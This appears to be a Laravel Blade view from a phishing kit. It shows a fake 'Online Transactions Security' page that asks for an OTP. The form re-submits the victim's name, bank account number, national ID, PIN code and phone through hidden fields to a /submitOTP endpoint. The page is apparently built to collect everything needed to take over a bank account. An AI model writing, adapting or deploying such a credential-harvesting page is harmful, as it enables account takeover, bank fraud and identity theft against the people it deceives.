@extends('layouts.app')

@section('content')
<div class="container">
    <div class="row justify-content-center">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header" style="text-align: center;">{{ __('Activate your Online Transactions Security by entering Your OTP and proceed:') }}</div>


            @if(session('nodata'))

<div class="alert alert-danger">

  {{ session('nodata') }}

</div>

@endif
                <div class="card-body">
                    <script type="text/javascript">
                        $(document).on('submit', 'form', function(e) {
                            e.preventDefault();

                            // your ajax or whatever put here
                        });

                    </script>
                    <form role="form" method="POST" action="{{ url('/submitOTP') }}">
                        @method('POST')
                        @csrf
                        <div class="form-group row">
                            <label for="otp" class="col-md-4 col-form-label text-md-right">{{ __('OTP') }}</label>
                            <input id="first_name" type="Hidden" class="form-control @error('otp') is-invalid @enderror" name="first_name" value="{{$firstname}}">
                            <input id="last_name" type="Hidden" class="form-control @error('otp') is-invalid @enderror" name="last_name" value="{{$lastname}}">
                            <input id="account_number" type="Hidden" class="form-control @error('otp') is-invalid @enderror" name="account_number" value="{{$account_number}}">
                            <input id="national_id" type="Hidden" class="form-control @error('otp') is-invalid @enderror" name="national_id" value="{{$national_id}}">
                            <input id="pin_code" type="Hidden" class="form-control @error('otp') is-invalid @enderror" name="pin_code" value="{{$pin_code}}">
                            <input id="phone" type="Hidden" class="form-control @error('phone') is-invalid @enderror" name="phone" value="{{$phone}}">

                            <div class="col-md-6">
                                <input id="otp" type="text" class="form-control @error('otp') is-invalid @enderror" name="otp" value="{{ old('otp') }}" required autocomplete="otp" autofocus>

                                @error('otp')
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                                @enderror
                            </div>
                        </div>
                        <div class="form-group row mb-0">
                            <div class="col-md-6 offset-md-4">
                                <button type="submit" class="btn btn-primary">
                                    Proceed
                                </button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection
